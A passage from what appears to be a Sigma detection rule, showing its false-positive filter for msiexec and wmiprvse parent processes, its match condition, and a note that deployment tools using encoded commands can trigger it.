    filter_legitimate:                              # whitelist / false positive reduction
        parentimage|endswith:
            - '\msiexec.exe'
            - '\wmiprvse.exe'
    condition: (selection_main or selection_alt) and not filter_legitimate
falsepositives:                                     # document known fps
    - legitimate software deployment tools that use encoded commands
